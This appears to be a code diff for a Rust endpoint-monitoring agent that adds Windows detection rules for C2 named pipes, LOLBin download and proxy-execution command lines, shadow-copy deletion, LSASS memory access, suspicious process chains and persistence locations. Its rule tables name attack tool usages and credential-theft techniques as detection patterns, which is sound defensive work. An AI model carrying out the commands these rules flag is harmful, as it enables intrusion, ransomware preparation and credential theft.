@@ -187,11 +187,18 @@ const WINDOWS_EXTRA_CHANNELS: &[(&str, &str, &[u32])] = &[
     // (CreateRemoteThread) and 25 (process tampering) carry blanket rules; 1
     // (process create) is high-volume and now affordable via offset tracking,
     // classified only by the shared LOLBin/obfuscation command-line rules (its
-    // message carries the full CommandLine), same as native 4688.
+    // message carries the full CommandLine), same as native 4688. 17/18 (named
+    // pipe created/connected, M1) carry no blanket rule either -- only a pipe
+    // whose name matches a known-C2 pattern (`MULTI_RULES`/pipe rules) is
+    // flagged, so benign pipes never produce noise. ID 10 (ProcessAccess) is
+    // NOT collected via this generic channel -- it's handled by a dedicated
+    // LSASS-targeted query (`windows_lsass_access_script`) so the common,
+    // benign case (every tool that opens a handle to a process) never floods
+    // the scan; only suspicious access to lsass.exe is emitted.
     (
         "Microsoft-Windows-Sysmon/Operational",
         "sysmon",
-        &[1, 8, 25],
+        &[1, 8, 17, 18, 25],
     ),
 ];
 
@@ -223,17 +230,19 @@ const WINDOWS_FIM_WATCHLIST: &[WindowsFimItem] = &[
         identifier: r"C:\Windows\System32\drivers\etc\hosts",
         capture_expr: "(Get-Content -Raw -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -ErrorAction SilentlyContinue)",
     },
-    // Deliberately HKLM only, not HKCU: the agent/service runs as
-    // `LocalSystem`, whose own HKCU is a never-used-for-real-persistence
-    // profile hive, not any interactively logged-in user's -- monitoring
-    // a real user's HKCU\...\Run would need enumerating and loading
-    // every other user profile's offline NTUSER.DAT hive under
-    // HKEY_USERS, a substantially bigger and more fragile piece of work
-    // than this pass's scope. Documented as a known gap, not silently
-    // dropped. `Sort-Object` guards against registry enumeration order
-    // not being a stable property to hash across scans the way whole-
-    // file content is -- an unsorted hash risks a spurious "changed"
-    // finding from nothing but reordering, not a real change.
+    // Machine-wide (HKLM) Run/RunOnce, and -- separately below -- the Run/
+    // RunOnce of every *currently-loaded* user hive under HKEY_USERS. The
+    // agent/service runs as `LocalSystem`, so a plain `HKCU:` only ever sees
+    // LocalSystem's own never-used-for-persistence profile; a real user's keys
+    // live under `HKEY_USERS\<SID>` while that user is logged on. Covering
+    // loaded hives catches the realistic case (persistence planted in an
+    // interactive/service user's profile) without the substantially more
+    // fragile work of enumerating and loading every logged-off user's offline
+    // `NTUSER.DAT` -- that remains a documented gap, not silently dropped.
+    // `Sort-Object` guards against registry enumeration order not being a
+    // stable property to hash across scans the way whole-file content is -- an
+    // unsorted hash risks a spurious "changed" finding from nothing but
+    // reordering, not a real change.
     WindowsFimItem {
         identifier: r"HKLM\...\CurrentVersion\Run(Once)",
         capture_expr: "(@('HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', \
@@ -241,6 +250,23 @@ const WINDOWS_FIM_WATCHLIST: &[WindowsFimItem] = &[
              $key = $_; Get-ItemProperty -Path $key -ErrorAction SilentlyContinue } | \
              ForEach-Object { $_.PSObject.Properties } | Where-Object { $_.Name -notmatch '^PS' } | \
              ForEach-Object { \"$($_.Name)=$($_.Value)\" } | Sort-Object)",
+    },
+    WindowsFimItem {
+        // Per-user Run/RunOnce for every loaded user hive. SID-prefixed so a
+        // key appearing/changing under any logged-on user's profile alters the
+        // hash. `.DEFAULT` and the three well-known service SIDs
+        // (S-1-5-18/19/20) and the paired `_Classes` hives are excluded as
+        // noise; whole thing sorted for a stable cross-scan hash.
+        identifier: r"HKU\<loaded>\...\CurrentVersion\Run(Once)",
+        capture_expr: "(Get-ChildItem Registry::HKEY_USERS -ErrorAction SilentlyContinue | \
+             Where-Object { $_.PSChildName -notmatch '_Classes$' -and \
+               $_.PSChildName -notin @('.DEFAULT','S-1-5-18','S-1-5-19','S-1-5-20') } | \
+             ForEach-Object { $sid = $_.PSChildName; \
+               @(\"Registry::HKEY_USERS\\$sid\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \
+                 \"Registry::HKEY_USERS\\$sid\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\") | \
+               ForEach-Object { Get-ItemProperty -Path $_ -ErrorAction SilentlyContinue } | \
+               ForEach-Object { $_.PSObject.Properties } | Where-Object { $_.Name -notmatch '^PS' } | \
+               ForEach-Object { \"$sid|$($_.Name)=$($_.Value)\" } } | Sort-Object)",
     },
     WindowsFimItem {
         identifier: "local-group:Administrators",
@@ -319,6 +345,35 @@ const WINDOWS_FIM_WATCHLIST: &[WindowsFimItem] = &[
              'ExclusionPath=' + (($_.ExclusionPath | Sort-Object) -join ';'); \
              'ExclusionProcess=' + (($_.ExclusionProcess | Sort-Object) -join ';'); \
              'ExclusionExtension=' + (($_.ExclusionExtension | Sort-Object) -join ';') })",
+    },
+    WindowsFimItem {
+        // Startup folders (all-users + every user profile's) -- a new file
+        // appearing here is a mainstream, low-tech persistence mechanism. File
+        // name + size per entry; a change (add/remove/replace) alters the hash.
+        identifier: "startup-folders",
+        capture_expr: "(@($env:ProgramData + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup') + \
+             @(Get-ChildItem 'C:\\Users' -Directory -ErrorAction SilentlyContinue | \
+               ForEach-Object { $_.FullName + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' }) | \
+             ForEach-Object { Get-ChildItem -Path $_ -File -ErrorAction SilentlyContinue } | \
+             ForEach-Object { \"$($_.FullName)|$($_.Length)\" } | Sort-Object)",
+    },
+    WindowsFimItem {
+        // LSA Security/Authentication/Notification packages -- DLLs the LSA
+        // loads at boot (SSP/AP/notification-package persistence & credential
+        // theft). REG_MULTI_SZ values flattened; any added package alerts.
+        identifier: r"HKLM\...\Lsa packages",
+        capture_expr: "((Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -ErrorAction SilentlyContinue | \
+             ForEach-Object { $_.PSObject.Properties } | \
+             Where-Object { $_.Name -in @('Security Packages','Authentication Packages','Notification Packages') } | \
+             ForEach-Object { \"$($_.Name)=$(($_.Value) -join ',')\" }) | Sort-Object)",
+    },
+    WindowsFimItem {
+        // Netsh helper DLLs -- a DLL registered here loads into every `netsh`
+        // invocation, a quiet persistence/proxied-execution spot.
+        identifier: r"HKLM\...\Netsh helpers",
+        capture_expr: "(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Netsh' -ErrorAction SilentlyContinue | \
+             ForEach-Object { $_.PSObject.Properties } | Where-Object { $_.Name -notmatch '^PS' } | \
+             ForEach-Object { \"$($_.Name)=$($_.Value)\" } | Sort-Object)",
     },
 ];
 
@@ -551,49 +606,333 @@ const RULES: &[(&str, &str, &str)] = &[
         "high",
         "Possible process tampering/hollowing (Sysmon)",
     ),
-    // ---- Phase 8: established outbound connections to a remote port
-    // long associated with reverse-shells/C2 (source "network-outbound",
-    // both platforms). Matched on an exact `remote_port=<n>` marker --
-    // never on "any unusual port," deliberately: outbound connections to
-    // brand-new external IPs/ports are completely ordinary traffic (CDN
-    // edges, load-balanced service pools), unlike a new *listening*
-    // port, so this stays a short, high-confidence list rather than a
-    // broad heuristic that would flag normal browsing/API traffic.
-    // Private/loopback/link-local destinations are filtered out before
-    // a line is ever formatted (`is_private_or_loopback`), so these only
-    // ever match genuinely external connections.
+    // Known command-and-control named-pipe names (Sysmon 17/18, M1). These are
+    // default pipe-name patterns baked into offensive C2 frameworks (Cobalt
+    // Strike `msagent_`/`postex_`/`MSSE-`, older `demoagent_`) -- distinctive
+    // enough that a bare substring match is high-confidence and won't collide
+    // with the legitimate named pipes Windows and applications create.
+    ("msagent_", "high", "Known command-and-control named pipe"),
+    ("postex_", "high", "Known command-and-control named pipe"),
+    ("MSSE-", "high", "Known command-and-control named pipe"),
+    ("demoagent_", "high", "Known command-and-control named pipe"),
+    // NB: outbound connections to reverse-shell/C2 ports (source
+    // "network-outbound", both platforms) are NOT in this static table --
+    // they're matched by `classify_line` against the operator-configurable
+    // `THANATOS_C2_PORTS` set, by exact numeric port. Kept out of the
+    // substring table deliberately: a substring needle like `remote_port=1337`
+    // also matches port 13370, and the port set is meant to be tunable without
+    // a rebuild. It stays a short, high-confidence list rather than a broad
+    // "any unusual port" heuristic -- brand-new external IPs/ports are
+    // ordinary traffic (CDN edges, load-balanced pools), unlike a new
+    // *listening* port. Private/loopback/link-local destinations are filtered
+    // (`is_private_or_loopback`) before a line is ever formatted.
+];
+
+/// Command-line LOLBin rules requiring **all** listed substrings to be present
+/// (M1). Matched case-insensitively against a lowercased copy of the line, so
+/// `VSSADMIN Delete Shadows` matches the same rule as `vssadmin delete
+/// shadows`. A single substring would be far too broad for these (`certutil`,
+/// `reg`, `net`, `delete` all have countless benign uses) -- it's the
+/// *combination* that's the signal, so each rule names every piece that must
+/// co-occur. Every needle here must be lowercase. First-match-wins, after the
+/// single-substring `RULES` table.
+const MULTI_RULES: &[(&[&str], &str, &str)] = &[
     (
-        "remote_port=4444",
+        &["certutil", "urlcache"],
         "high",
-        "Outbound connection to a well-known reverse-shell port",
+        "Ingress tool transfer via certutil",
     ),
     (
-        "remote_port=1337",
+        &["bitsadmin", "/transfer"],
         "high",
-        "Outbound connection to a well-known reverse-shell port",
+        "Download via bitsadmin",
+    ),
+    (&["mshta", "http"], "high", "Proxied execution via mshta"),
+    (
+        &["mshta", "vbscript:"],
+        "high",
+        "Proxied execution via mshta",
     ),
     (
-        "remote_port=31337",
+        &["regsvr32", "scrobj"],
         "high",
-        "Outbound connection to a well-known reverse-shell port",
+        "Proxied execution via regsvr32",
     ),
     (
-        "remote_port=6666",
+        &["rundll32", "javascript:"],
         "high",
-        "Outbound connection to a well-known reverse-shell port",
+        "Proxied execution via rundll32",
     ),
     (
-        "remote_port=6667",
+        &["vssadmin", "delete", "shadows"],
         "high",
-        "Outbound connection to a well-known reverse-shell port",
+        "Shadow copy / backup deletion (ransomware precursor)",
+    ),
+    (
+        &["wmic", "shadowcopy", "delete"],
+        "high",
+        "Shadow copy / backup deletion (ransomware precursor)",
+    ),
+    (
+        &["wbadmin", "delete", "catalog"],
+        "high",
+        "Shadow copy / backup deletion (ransomware precursor)",
+    ),
+    (
+        &["bcdedit", "recoveryenabled", "no"],
+        "high",
+        "Shadow copy / backup deletion (ransomware precursor)",
+    ),
+    (
+        &["wevtutil", "cl "],
+        "high",
+        "Event log cleared via wevtutil",
+    ),
+    (
+        &["reg", "add", "currentversion\\run"],
+        "medium",
+        "Run-key persistence added via reg.exe",
+    ),
+    (
+        &["net", "user", "/add"],
+        "medium",
+        "Local account created via net.exe",
     ),
 ];
 
 fn classify(line: &str) -> Option<(&'static str, &'static str)> {
-    RULES
+    if let Some((_, severity, label)) = RULES.iter().find(|(needle, _, _)| line.contains(needle)) {
+        return Some((*severity, *label));
+    }
+    // Multi-substring LOLBin rules, case-insensitive. Only lowercased once, and
+    // only if nothing in the (case-sensitive, EventID-anchored) RULES matched.
+    let lowered = line.to_ascii_lowercase();
+    MULTI_RULES
         .iter()
-        .find(|(needle, _, _)| line.contains(needle))
+        .find(|(needles, _, _)| needles.iter().all(|n| lowered.contains(n)))
         .map(|(_, severity, label)| (*severity, *label))
+}
+
+/// Classifies one gathered line. Event-log / command-line / log content goes
+/// through the static `RULES` substring table first; an outbound-network line
+/// that nothing in the table matched is then checked against the
+/// operator-configurable C2 port set by **exact numeric port** (so port 13370
+/// never trips a rule meant for 1337, which prefix-substring matching did).
+/// Shared by both platforms' scan loops.
+fn classify_line(
+    source: &str,
+    line: &str,
+    c2_ports: &[u16],
+) -> Option<(&'static str, &'static str)> {
+    if let Some(hit) = classify(line) {
+        return Some(hit);
+    }
+    if source == "network-outbound"
+        && let Some(port) = outbound_remote_port(line)
+        && c2_ports.contains(&port)
+    {
+        return Some((
+            "high",
+            "Outbound connection to a flagged C2/reverse-shell port",
+        ));
+    }
+    None
+}
+
+/// Pulls the numeric remote port out of a `remote_port=<n>\tremote_addr=...`
+/// outbound line. Anchored on the `remote_port=` prefix and parsed as a whole
+/// `u16`, so matching is exact, never a substring of a longer port number.
+fn outbound_remote_port(line: &str) -> Option<u16> {
+    line.strip_prefix("remote_port=")
+        .and_then(|rest| rest.split('\t').next())
+        .and_then(|port| port.parse::<u16>().ok())
+}
+
+// ---- Process ancestry (M1) ------------------------------------------------
+// Pure, testable parent->child chain classification. Compiled on Windows (the
+// only caller) and under test (so it's exercised on the host target too).
+
+/// Productivity apps and browsers that should essentially never spawn a shell
+/// or script host -- a child that does is the classic phishing/exploit
+/// execution chain. Lowercase, for case-insensitive comparison.
+#[cfg(any(windows, test))]
+const ANCESTRY_DOC_PARENTS: &[&str] = &[
+    "winword.exe",
+    "excel.exe",
+    "powerpnt.exe",
+    "outlook.exe",
+    "msaccess.exe",
+    "mspub.exe",
+    "visio.exe",
+    "onenote.exe",
+    "chrome.exe",
+    "firefox.exe",
+    "msedge.exe",
+    "iexplore.exe",
+    "acrord32.exe",
+    "acrobat.exe",
+];
+
+/// Command interpreters proper.
+#[cfg(any(windows, test))]
+const ANCESTRY_SHELL_CHILDREN: &[&str] = &["cmd.exe", "powershell.exe", "pwsh.exe"];
+
+/// Script hosts and proxy-execution LOLBins (shells included -- a document
+/// process launching any of these is suspicious).
+#[cfg(any(windows, test))]
+const ANCESTRY_LOLBIN_CHILDREN: &[&str] = &[
+    "cmd.exe",
+    "powershell.exe",
+    "pwsh.exe",
+    "wscript.exe",
+    "cscript.exe",
+    "mshta.exe",
+    "rundll32.exe",
+    "regsvr32.exe",
+    "bitsadmin.exe",
+    "certutil.exe",
+];
+
+/// Service hosts whose spawning of an interactive shell is a lateral-movement /
+/// living-off-the-land signal (WMI remote exec; a service launching cmd).
+#[cfg(any(windows, test))]
+const ANCESTRY_SERVICE_PARENTS: &[&str] = &["wmiprvse.exe", "services.exe"];
+
+/// Classifies one parent->child process chain, returning a static finding label
+/// when it's suspicious. Case-insensitive on the image basenames.
+#[cfg(any(windows, test))]
+fn ancestry_label(parent: &str, child: &str) -> Option<&'static str> {
+    let parent = parent.to_ascii_lowercase();
+    let child = child.to_ascii_lowercase();
+    let has = |set: &[&str], v: &str| set.contains(&v);
+    if has(ANCESTRY_DOC_PARENTS, &parent) && has(ANCESTRY_SHELL_CHILDREN, &child) {
+        return Some("Office application spawned a command interpreter");
+    }
+    if has(ANCESTRY_DOC_PARENTS, &parent) && has(ANCESTRY_LOLBIN_CHILDREN, &child) {
+        return Some("Script host or LOLBin spawned by an office/browser process");
+    }
+    if has(ANCESTRY_SERVICE_PARENTS, &parent) && has(ANCESTRY_SHELL_CHILDREN, &child) {
+        return Some("Command shell spawned by a long-running service host");
+    }
+    None
+}
+
+/// Collapses whitespace/tabs and bounds a detail string so it can't break the
+/// tab-delimited wire format or bloat a finding.
+#[cfg(any(windows, test))]
+fn sanitize_detail(s: &str, max: usize) -> String {
+    let cleaned = s.trim().replace(['\t', '\n', '\r'], " ");
+    if cleaned.chars().count() <= max {
+        cleaned
+    } else {
+        let truncated: String = cleaned.chars().take(max).collect();
+        format!("{truncated}...")
+    }
+}
+
+/// Builds process-ancestry findings from a `(pid, parent_pid, name, cmdline)`
+/// snapshot. Looks each process's parent up by pid, and for a suspicious chain
+/// emits a complete `high\t<label>\tprocess-ancestry\t<detail>` wire line
+/// naming the chain. De-duplicated by (parent, child) basename so a burst of
+/// identical chains collapses to one line.
+#[cfg(any(windows, test))]
+fn ancestry_findings(snapshot: &[(u32, u32, String, String)]) -> Vec<String> {
+    use std::collections::{HashMap, HashSet};
+    let name_by_pid: HashMap<u32, &str> = snapshot
+        .iter()
+        .map(|(pid, _, name, _)| (*pid, name.as_str()))
+        .collect();
+    let mut seen: HashSet<(String, String)> = HashSet::new();
+    let mut out = Vec::new();
+    for (_pid, ppid, name, cmdline) in snapshot {
+        let Some(parent_name) = name_by_pid.get(ppid).copied() else {
+            continue;
+        };
+        if let Some(label) = ancestry_label(parent_name, name) {
+            let key = (parent_name.to_ascii_lowercase(), name.to_ascii_lowercase());
+            if !seen.insert(key) {
+                continue;
+            }
+            let cmd = sanitize_detail(cmdline, 200);
+            out.push(format!(
+                "high\t{label}\tprocess-ancestry\tparent={parent_name} child={name} cmd={cmd}"
+            ));
+        }
+    }
+    out
+}
+
+// ---- LSASS access (Sysmon 10, M1) -----------------------------------------
+
+/// Sysmon ProcessAccess `GrantedAccess` masks associated with reading another
+/// process's memory (credential dumping against lsass): `PROCESS_VM_READ` and
+/// the broad all-access masks. A handle opened without these (e.g. a mere
+/// `PROCESS_QUERY_LIMITED_INFORMATION`) is ordinary and not flagged.
+#[cfg(any(windows, test))]
+const LSASS_SUSPICIOUS_ACCESS: &[&str] = &[
+    "0x1010", "0x1410", "0x1438", "0x143a", "0x1fffff", "0x1f1fff", "0x1f2fff", "0x1f3fff",
+];
+
+/// Builds a finding for one Sysmon-10 access to lsass, or `None` when the
+/// target isn't lsass or the granted access isn't memory-reading. Pure/testable.
+#[cfg(any(windows, test))]
+fn lsass_access_finding(
+    source_image: &str,
+    target_image: &str,
+    granted_access: &str,
+) -> Option<String> {
+    let target = target_image.to_ascii_lowercase();
+    if !target.ends_with("\\lsass.exe") && target != "lsass.exe" {
+        return None;
+    }
+    let access = granted_access.trim().to_ascii_lowercase();
+    if !LSASS_SUSPICIOUS_ACCESS.contains(&access.as_str()) {
+        return None;
+    }
+    let source = sanitize_detail(source_image, 200);
+    Some(format!(
+        "high\tPossible LSASS memory access (credential theft)\tsysmon\tsource={source} target={target_image} access={granted_access}"
+    ))
+}
+
+/// Queries Sysmon for ProcessAccess (event 10) handles opened against lsass
+/// with a memory-reading access mask -- the on-host credential-dumping signal.
+/// Best-effort: returns an empty vec if Sysmon isn't installed or the query
+/// fails. Most Sysmon configs already scope ProcessAccess logging to lsass, so
+/// the recent-window read stays cheap; the control plane dedups re-reads by
+/// content hash (the RecordId is included so distinct accesses stay distinct).
+#[cfg(windows)]
+async fn windows_lsass_access_findings() -> Vec<String> {
+    // Pull the EventData fields we need (SourceImage/TargetImage/GrantedAccess)
+    // plus the RecordId, tab-joined, and classify in Rust so the mask/target
+    // logic lives in one tested place.
+    let script = "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=10} \
+         -MaxEvents 1000 -ErrorAction SilentlyContinue | ForEach-Object { \
+         $x = [xml]$_.ToXml(); $d = @{}; \
+         $x.Event.EventData.Data | ForEach-Object { $d[$_.Name] = $_.'#text' }; \
+         \"$($_.RecordId)`t$($d['SourceImage'])`t$($d['TargetImage'])`t$($d['GrantedAccess'])\" }";
+    let mut out = Vec::new();
+    if let Ok(output) = crate::process::run_command(
+        "powershell.exe",
+        &["-NoProfile", "-NonInteractive", "-Command", script],
+    )
+    .await
+    {
+        for line in output.stdout.lines() {
+            let mut parts = line.splitn(4, '\t');
+            let (Some(rid), Some(source), Some(target), Some(access)) =
+                (parts.next(), parts.next(), parts.next(), parts.next())
+            else {
+                continue;
+            };
+            if let Some(finding) = lsass_access_finding(source, target, access) {
+                // Append the RecordId so repeated accesses stay distinct rows
+                // while a re-read of the same event dedups by content hash.
+                out.push(format!("{finding} rid={}", rid.trim()));
+            }
+        }
+    }
+    out
 }
 
 /// Extracts the port from a `ss`/`netstat` listing line's local-address
@@ -801,8 +1140,29 @@ pub async fn scan_security_events(
     extra_fim_paths: Vec<String>,
     // Windows-only: Linux scans by log tail, not Event Log record ids.
     _channel_offsets: Vec<(String, u64)>,
+    c2_ports: Vec<u16>,
+    fast_only: bool,
 ) -> CommandOutcome {
     let mut lines_with_source: Vec<(&'static str, String)> = Vec::new();
+
+    // Fast "act-now" sweep (M6 Option A): on Linux the low-latency signal worth
+    // catching between full sweeps is a reverse shell / LOLBin in a running
+    // process's command line, which is cheap to read. Everything else (auth
+    // logs, kernel, FIM, ports, modules) stays on the full sweep.
+    if fast_only {
+        if let Ok(output) = elevation
+            .run_allow_failure("ps", &["-eo", "args", "--no-headers"])
+            .await
+            && output.exit_code == Some(0)
+        {
+            for line in output.stdout.lines() {
+                if !line.trim().is_empty() {
+                    lines_with_source.push(("process", line.to_string()));
+                }
+            }
+        }
+        return fast_scan_outcome(&lines_with_source, &c2_ports);
+    }
 
     // ---- Auth/login sources: a flat log file, or journalctl only if
     // neither flat candidate was readable at all. ----
@@ -937,7 +1297,7 @@ pub async fn scan_security_events(
     let mut stdout = String::new();
     let mut matched_count = 0usize;
     for (source, line) in &lines_with_source {
-        if let Some((severity, label)) = classify(line) {
+        if let Some((severity, label)) = classify_line(source, line, &c2_ports) {
             matched_count += 1;
             stdout.push_str(&format!("{severity}\t{label}\t{source}\t{line}\n"));
         }
@@ -1064,6 +1424,79 @@ fn windows_channel_script(log_name: &str, ids: &[u32], offset: u64) -> String {
     )
 }
 
+/// Curated high-signal, low-volume Event Log channels/IDs the fast "act-now"
+/// sweep reads (M6 Option A). Deliberately small: 1102 (log cleared), 4719
+/// (audit policy changed), 4648 (explicit-credential/lateral logon), 4688
+/// (process creation -- the LOLBin/ransomware command-line rules fire on it),
+/// Sysmon 1/8/25 (process create / injection / tampering), and Defender
+/// 1116/5001 (malware / real-time protection off). Everything else -- posture,
+/// FIM, ports, LSASS, ancestry, outbound -- stays on the full sweep.
+#[cfg(windows)]
+const WINDOWS_FAST_CHANNELS: &[(&str, &str, &[u32])] = &[
+    ("Security", "security", &[1102, 4719, 4648, 4688]),
+    (
+        "Microsoft-Windows-Sysmon/Operational",
+        "sysmon",
+        &[1, 8, 25],
+    ),
+    (
+        "Microsoft-Windows-Windows Defender/Operational",
+        "defender",
+        &[1116, 5001],
+    ),
+];
+
+/// How many recent events the fast sweep reads per channel. Small, because it
+/// runs every few seconds; overlap with the previous tick and with the full
+/// sweep is collapsed by content-hash dedup control-plane-side.
+const FAST_FETCH: u32 = 50;
+
+/// Fast-sweep channel query (M6 Option A): the curated IDs over a small recent
+/// window, with **no** `EventRecordID` offset filter and **no** `MAXRID` line.
+/// The fast sweep is a best-effort low-latency pass and deliberately does not
+/// advance the full sweep's per-channel high-water marks -- that stays the
+/// complete source of truth. Emits the same tab-delimited event lines the
+/// classify pass expects. Log names/ids are fixed constants (never wire input),
+/// so no escaping concern. Pure, so it's unit-tested on every platform; only
+/// called from the Windows fast path.
+#[cfg_attr(not(windows), allow(dead_code))]
+fn windows_fast_channel_script(log_name: &str, ids: &[u32]) -> String {
+    let id_list = ids.iter().map(u32::to_string).collect::<Vec<_>>().join(",");
+    format!(
+        "Get-WinEvent -FilterHashtable @{{LogName='{log_name}';Id={id_list}}} -MaxEvents {FAST_FETCH} -ErrorAction SilentlyContinue | ForEach-Object {{ \
+         $raw = $_.Message; \
+         $m = ($raw -replace '\\r?\\n', ' ').Trim(); \
+         if ($m.Length -gt 300) {{ $m = $m.Substring(0, 300) }}; \
+         $ipm = [regex]::Match($raw, 'Source Network Address:\\s+(\\S+)'); \
+         $ip = if ($ipm.Success -and $ipm.Groups[1].Value -ne '-') {{ $ipm.Groups[1].Value }} else {{ '' }}; \
+         $accts = [regex]::Matches($raw, 'Account Name:\\s+(\\S+)') | ForEach-Object {{ $_.Groups[1].Value }} | Where-Object {{ $_ -ne '-' }}; \
+         $acct = if ($accts) {{ @($accts)[-1] }} else {{ '' }}; \
+         \"EventID=$($_.Id)`tTime=$($_.TimeCreated.ToString('o'))`tIpAddress=$ip`tAccount=$acct`t$m\" }}"
+    )
+}
+
+/// Classifies a fast-sweep's gathered lines and wraps them as a scan outcome --
+/// the same classify-and-emit pass the full sweep runs, and nothing else (M6
+/// Option A). No `info` line: the fast sweep runs every few seconds, so a
+/// "nothing matched" note every tick would be pure noise; the full sweep
+/// already reports scan health. Shared by both platforms' fast path.
+fn fast_scan_outcome(
+    lines_with_source: &[(&'static str, String)],
+    c2_ports: &[u16],
+) -> CommandOutcome {
+    let mut stdout = String::new();
+    for (source, line) in lines_with_source {
+        if let Some((severity, label)) = classify_line(source, line, c2_ports) {
+            stdout.push_str(&format!("{severity}\t{label}\t{source}\t{line}\n"));
+        }
+    }
+    CommandOutcome::Ok(OperationOutput {
+        stdout,
+        stderr: String::new(),
+        exit_code: Some(0),
+    })
+}
+
 /// Windows equivalent of the Unix `scan_security_events` above -- same
 /// wire format, same classify()/RULES pass, different gathering. Reads
 /// via `Get-WinEvent` (shelled out through `powershell.exe`) rather than
@@ -1080,8 +1513,37 @@ pub async fn scan_security_events(
     _elevation: &ElevationState,
     extra_fim_paths: Vec<String>,
     channel_offsets: Vec<(String, u64)>,
+    c2_ports: Vec<u16>,
+    fast_only: bool,
 ) -> CommandOutcome {
     use std::collections::HashMap;
+
+    // Fast "act-now" sweep (M6 Option A): only the curated high-signal Event Log
+    // IDs over a small recent window, no offset tracking (so it never touches
+    // the full sweep's high-water marks) and no FIM/posture/ports/ancestry/LSASS
+    // query. Cheap enough to run every few seconds; the full 60s sweep stays the
+    // complete, offset-tracked source of truth, and content-hash dedup collapses
+    // the overlap.
+    if fast_only {
+        let mut fast_lines: Vec<(&'static str, String)> = Vec::new();
+        for &(log_name, source, ids) in WINDOWS_FAST_CHANNELS {
+            let script = windows_fast_channel_script(log_name, ids);
+            if let Ok(output) = crate::process::run_command(
+                "powershell.exe",
+                &["-NoProfile", "-NonInteractive", "-Command", &script],
+            )
+            .await
+            {
+                for line in output.stdout.lines() {
+                    if !line.trim().is_empty() {
+                        fast_lines.push((source, line.to_string()));
+                    }
+                }
+            }
+        }
+        return fast_scan_outcome(&fast_lines, &c2_ports);
+    }
+
     let offsets: HashMap<&str, u64> = channel_offsets
         .iter()
         .map(|(k, v)| (k.as_str(), *v))
@@ -1091,6 +1553,11 @@ pub async fn scan_security_events(
     // (source, new high-water record id) to report back so the control plane
     // advances this host's offsets.
     let mut new_offsets: Vec<(&'static str, u64)> = Vec::new();
+    // Already-classified findings determined directly (process ancestry, LSASS
+    // access), not via the `classify()` substring pass -- each is a complete
+    // `severity\tlabel\tsource\tdetail` wire line, appended to `stdout` after
+    // the classify loop the same way posture/Defender/unquoted-path findings are.
+    let mut direct_findings: Vec<String> = Vec::new();
 
     let mut channels: Vec<(&'static str, &'static str, &'static [u32])> = vec![
         ("Security", "security", WINDOWS_SECURITY_EVENT_IDS),
@@ -1131,11 +1598,15 @@ pub async fn scan_security_events(
         }
     }
 
-    // Process command lines -- fed through the same classify() pass as
-    // every event-log source (source "process"), not diffed. Plain
-    // `Get-Process` doesn't expose a command line; `Win32_Process` does.
+    // Process snapshot -- one `Win32_Process` query serving two purposes
+    // (M1): every command line goes through the same classify() pass as the
+    // event-log sources (source "process", unchanged behaviour), and the
+    // pid/parent-pid/name tuples feed the process-ancestry check below. `|`
+    // field separator (a character a Windows image path or command line never
+    // contains) keeps parsing unambiguous; a missing command line prints empty.
     let process_script = "Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | \
-         Select-Object -ExpandProperty CommandLine";
+         ForEach-Object { \"$($_.ProcessId)|$($_.ParentProcessId)|$($_.Name)|$($_.CommandLine)\" }";
+    let mut proc_snapshot: Vec<(u32, u32, String, String)> = Vec::new();
     if let Ok(output) = crate::process::run_command(
         "powershell.exe",
         &["-NoProfile", "-NonInteractive", "-Command", process_script],
@@ -1143,10 +1614,27 @@ pub async fn scan_security_events(
     .await
     {
         for line in output.stdout.lines() {
-            if !line.trim().is_empty() {
-                lines_with_source.push(("process", line.to_string()));
+            let mut parts = line.splitn(4, '|');
+            let (Some(pid), Some(ppid), Some(name), cmdline) = (
+                parts.next(),
+                parts.next(),
+                parts.next(),
+                parts.next().unwrap_or(""),
+            ) else {
+                continue;
+            };
+            if !cmdline.trim().is_empty() {
+                lines_with_source.push(("process", cmdline.to_string()));
+            }
+            if let (Ok(pid), Ok(ppid)) = (pid.trim().parse::<u32>(), ppid.trim().parse::<u32>()) {
+                proc_snapshot.push((pid, ppid, name.trim().to_string(), cmdline.to_string()));
             }
         }
+    }
+    // Process ancestry: flag a suspicious parent->child chain (e.g. an Office
+    // app spawning a shell), with the specific chain named in the finding.
+    for finding in ancestry_findings(&proc_snapshot) {
+        direct_findings.push(finding);
     }
 
     // Established outbound connections to a non-private remote address
@@ -1180,14 +1668,32 @@ pub async fn scan_security_events(
         }
     }
 
+    // LSASS memory access (Sysmon 10, M1): a dedicated, tightly-scoped query
+    // rather than a generic channel. Sysmon ProcessAccess fires on every handle
+    // opened to any process (overwhelmingly benign), so collecting it broadly
+    // would flood the scan; instead this filters server-side to TargetImage
+    // ending in lsass.exe and reports only the suspicious high-access masks
+    // associated with credential dumping (0x1010/0x1410/0x1438/0x143a/0x1fffff).
+    // The SourceImage opening the handle is named in the finding. Best-effort:
+    // silently nothing if Sysmon isn't installed.
+    direct_findings.extend(windows_lsass_access_findings().await);
+
     let scanned = lines_with_source.len();
     let mut stdout = String::new();
     let mut matched_count = 0usize;
     for (source, line) in &lines_with_source {
-        if let Some((severity, label)) = classify(line) {
+        if let Some((severity, label)) = classify_line(source, line, &c2_ports) {
             matched_count += 1;
             stdout.push_str(&format!("{severity}\t{label}\t{source}\t{line}\n"));
         }
+    }
+
+    // Already-classified findings (process ancestry, LSASS access) -- emitted
+    // the same way posture/Defender findings are, each a complete wire line.
+    for finding in &direct_findings {
+        matched_count += 1;
+        stdout.push_str(finding);
+        stdout.push('\n');
     }
 
     // Unquoted service paths -- a definitive misconfiguration (not a pattern
@@ -1207,7 +1713,7 @@ pub async fn scan_security_events(
             {
                 matched_count += 1;
                 stdout.push_str(&format!(
-                    "warning\tUnquoted service path\tservice-config\tservice={} path={}\n",
+                    "medium\tUnquoted service path\tservice-config\tservice={} path={}\n",
                     name.trim(),
                     path.trim()
                 ));
@@ -1252,6 +1758,14 @@ pub async fn scan_security_events(
          if ($rdpDeny -eq 0 -and $nla -eq 0) { $out += \"medium`tRDP without Network Level Authentication`tposture`tUserAuthentication=0\" }; \
